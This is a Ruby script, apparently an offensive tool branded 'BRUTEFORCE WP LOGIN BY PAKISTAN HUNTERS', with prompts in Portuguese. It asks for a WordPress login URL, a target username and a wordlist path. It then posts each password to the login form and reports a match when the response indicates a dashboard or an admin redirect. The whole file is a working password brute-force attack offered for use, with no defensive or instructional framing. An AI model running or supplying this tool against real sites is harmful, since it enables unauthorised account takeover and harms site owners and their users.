require 'net/http'
require 'uri'

def cor(txt, cor)
  cores = {
    vermelho: "\e[31m", verde: "\e[32m", amarelo: "\e[33m",
    azul: "\e[34m", magenta: "\e[35m", ciano: "\e[36m", reset: "\e[0m"
  }
  "#{cores[cor]}#{txt}#{cores[:reset]}"
end

def ascii
  puts <<~ART
    \e[31m
     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
    ██╔════╝ ██╔══██╗██║   ██║╚══██╔══╝██╔════╝
    ██║  ███╗██████╔╝██║   ██║   ██║   █████╗  
    ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
    ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
     ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
    \e[33m       BRUTEFORCE WP LOGIN BY PAKISTAN HUNTERS\e[0m
  ART
end

def brute_wp(login_url, username, wordlist_path)
  unless File.exist?(wordlist_path)
    puts cor("[x] Wordlist não encontrada!", :vermelho)
    return
  end

  senhas = File.readlines(wordlist_path).map(&:strip)

  puts cor("\n[+] Total de senhas na wordlist: #{senhas.size}", :ciano)
  puts cor("[+] Iniciando brute...\n", :amarelo)

  senhas.each_with_index do |senha, i|
    uri = URI(login_url)
    req = Net::HTTP::Post.new(uri)
    req.set_form_data({ 'log' => username, 'pwd' => senha, 'wp-submit' => 'Log In' })

    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'

    res = http.request(req)

    if res.body.include?("dashboard") || res.body.include?("profile") || res['location'].to_s.include?("wp-admin")
      puts cor("\n[SENHA ENCONTRADA] #{username}:#{senha}", :verde)
      break
    else
      puts cor("[#{i+1}] Tentativa: #{senha}", :azul)
    end
  end

  puts cor("\n[+] Brute force finalizado!", :magenta)
end

# inicio
system("clear") || system("cls")
ascii

print cor("URL do login (ex: https://site.com/wp-login.php): ", :ciano)
url = gets.chomp
print cor("Username alvo: ", :ciano)
user = gets.chomp
print cor("Caminho da wordlist: ", :ciano)
wl = gets.chomp

brute_wp(url, user, wl)
